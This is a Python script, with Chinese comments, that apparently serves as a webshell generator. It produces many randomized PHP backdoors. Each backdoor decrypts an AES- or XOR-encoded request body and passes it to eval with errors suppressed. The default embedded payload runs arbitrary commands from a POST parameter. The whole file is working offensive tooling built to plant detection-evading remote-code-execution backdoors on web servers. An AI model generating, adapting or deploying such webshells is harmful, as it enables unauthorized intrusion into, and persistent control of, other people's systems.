import os
import random
import string
import argparse
from Crypto.Cipher import AES
import base64


def random_var(length=6):
    return ''.join(random.choices(string.ascii_letters, k=length))

def pad(s):
    return s + (16 - len(s) % 16) * chr(16 - len(s) % 16)

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def aes_encrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(key, AES.MODE_ECB)
    padded = pad(data.decode()).encode()
    return cipher.encrypt(padded)

def generate_webshell(payload: str, enc_mode: str, key: str) -> (str, str):
    key_bytes = key.encode()
    encoded_payload = b''

    if enc_mode == 'aes':
        encoded_payload = aes_encrypt(payload.encode(), key_bytes)
    elif enc_mode == 'xor':
        encoded_payload = xor_encrypt(payload.encode(), key_bytes)
    else:
        encoded_payload = payload.encode()

    b64_payload = base64.b64encode(encoded_payload).decode()

    # 动态变量名和函数名
    var_names = {name: random_var() for name in ['key', 'cipher', 'payload', 'decode', 'exec_func', 'input']}

    # 动态构造函数名调用
    dynamic_eval = f"(new class{{function __invoke($x){{eval($x);}}}})"

    # 嵌套base64层 + 可变调用
    webshell = f"""<?php
    session_start();
    error_reporting(0);
    ${var_names['key']} = "{key}";
    ${var_names['input']} = file_get_contents("php://input");

    if (function_exists("openssl_decrypt")) {{
        ${var_names['decode']} = openssl_decrypt(base64_decode(${var_names['input']}), "AES-128-ECB", ${var_names['key']});
    }} else {{
        ${var_names['decode']} = base64_decode(${var_names['input']});
        for ($i = 0; $i < strlen(${var_names['decode']}); $i++) {{
            ${var_names['decode']}[$i] = ${var_names['decode']}[$i] ^ ${var_names['key']}[$i % strlen(${var_names['key']})];
        }}
    }}

    ${var_names['exec_func']} = {dynamic_eval};
    @call_user_func(${var_names['exec_func']}, ${var_names['decode']});
?>"""

    return webshell, b64_payload


def main():
    """
    生成 webshell 的 demo
    python3 demo1.py --num 10 --enc aes --key yourkey --payload "eval(\$_POST['cmd']);"
    """
    parser = argparse.ArgumentParser(description='WebShell Fuzzer Generator')
    parser.add_argument('-n', '--num', type=int, default=5, help='Number of webshells to generate')
    parser.add_argument('--enc', choices=['aes', 'xor', 'none'], default='xor', help='Encryption type')
    parser.add_argument('--key', type=str, default='e45e329feb5d925b', help='Encryption key')
    parser.add_argument('--payload', type=str, default="eval($_POST['cmd']);", help='Payload to embed')
    args = parser.parse_args()

    os.makedirs('output', exist_ok=True)

    for i in range(args.num):
        shell_code, payload = generate_webshell(args.payload, args.enc, args.key)
        with open(f'output/output_shell_{i}.php', 'w') as f:
            f.write(shell_code)
        with open(f'output/output_payload_{i}.txt', 'w') as f:
            f.write(payload)

    print(f"[+] Done. Generated {args.num} webshells in ./output")


if __name__ == '__main__':
    main()